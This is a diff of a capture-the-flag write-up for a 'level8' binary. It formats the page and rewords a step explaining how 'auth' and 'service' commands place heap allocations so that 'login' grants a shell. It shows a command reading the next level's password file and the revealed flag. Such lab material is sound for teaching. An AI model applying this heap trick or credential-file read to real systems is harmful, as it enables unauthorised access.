@@ -1,3 +1,5 @@
+<p align="justify">
+
 level8 protections:
 ```Shell
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
@@ -32,8 +34,9 @@ auth coucou
 service 1
 0x804a008, 0x804a018 
 ```
-Doing the address of `service 1`(0x804a018) - `auth coucou`(0x804a008) = 16, which means that if we add another `service`, we reach 32 and can finally call `login` to get the password.
+Doing the address of `service 1`(0x804a018) - `auth coucou`(0x804a008) = 16, which means that if we add another `service`, we reach 32.
 
+Then we can finally call `login` to get the password.
 ```Shell
 service 2
 0x804a008, 0x804a028
@@ -41,3 +44,5 @@ login
 $ cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
+
+</p>
